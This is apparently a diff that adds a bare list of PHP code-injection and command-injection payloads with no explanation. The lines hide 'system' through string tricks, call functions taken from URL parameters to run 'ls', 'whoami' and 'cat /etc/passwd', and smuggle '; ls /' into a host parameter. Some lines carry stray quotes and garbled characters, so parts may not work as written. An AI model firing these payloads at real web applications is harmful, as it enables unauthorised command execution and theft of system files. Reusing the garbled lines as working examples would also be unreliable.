@@ -1,0 +1,9 @@
+(system)/* comment here */(ls) /* and here. */;
+(sy.(st).em)(cat." /".etc." /".passwd
+a=(system);b=ls;id=$_GET[a]($_GET[b]);
+(sy.(st).em)(whoami);
+?a=system&b=cat+/etc&c=/passwd&code=$_GET[a]($_GET[b].$_GET[c]);
+get_defined_functions()[internal];
+$a=”elmsty/ “;($a[3]$a[5]$a[3]$a[4]$a[0]$a[2])($a[1]$a[3]$a[-1]$a[-2].temp)
+/?host=www.google.com;ls+/
+;<space><uninitialized var><command>
